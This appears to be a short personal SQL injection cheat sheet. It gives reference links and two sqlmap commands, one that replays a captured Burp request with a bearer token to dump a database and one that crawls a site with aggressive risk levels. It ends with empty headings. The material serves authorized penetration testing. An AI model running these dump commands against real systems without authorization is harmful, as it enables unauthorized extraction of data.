



#### Reference
[DeepWiki SQL Inject CheatSheet](https://deepwiki.com/EdOverflow/bugbounty-cheatsheet/2.2.3-sql-injection-(sqli))
[WebSecWordPress Advance SQL Injections](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/)


## SQLMap Commands
#### Quick and Dirty, dump it all!
```bash
# Save the request on Burp as req.txt
token='Authoriation: Bearer ey...'

sqlmap -r /tmp/req2.txt --batch --headers=$token --dump
```
#### Crawl a website and test for SQL Injection
Not had good results yet, as it takes too long
```bash
token='Authoriation: Bearer ey...'
sqlmap -u $url --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --headers=$token --dbms=sqlite
```

# SQL Boolean Check



# SQL UNION Check